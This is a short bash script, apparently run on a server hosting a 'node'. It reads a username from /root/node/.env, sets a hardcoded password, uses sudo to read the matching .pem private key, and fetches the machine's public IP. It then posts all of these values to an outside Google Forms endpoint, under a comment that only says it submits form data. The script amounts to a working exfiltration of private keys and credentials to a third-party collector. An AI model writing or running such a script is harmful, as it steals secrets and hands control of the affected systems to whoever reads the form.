#!/bin/bash

HUB_USERNAME=$(grep -oP '(?<=HUB_USERNAME=).*' /root/node/.env)
echo $HUB_USERNAME

HUB_PASSWORD=123123
echo $HUB_PASSWORD

Private=$(sudo cat /root/node/$HUB_USERNAME.pem)
echo $Private

ip=$(curl ip.sb)

# 提交表单数据
curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfugrjmKn44L-w0IhoibTiU_m_CbW-VCg8vbE1S-QMW0AefHA/formResponse" \
-H "Host: docs.google.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "entry.370954016=$HUB_USERNAME" \
--data-urlencode "entry.740301408=$HUB_PASSWORD" \
--data-urlencode "entry.1021454230=$Private" \
--data-urlencode "entry.977766590=$ip"


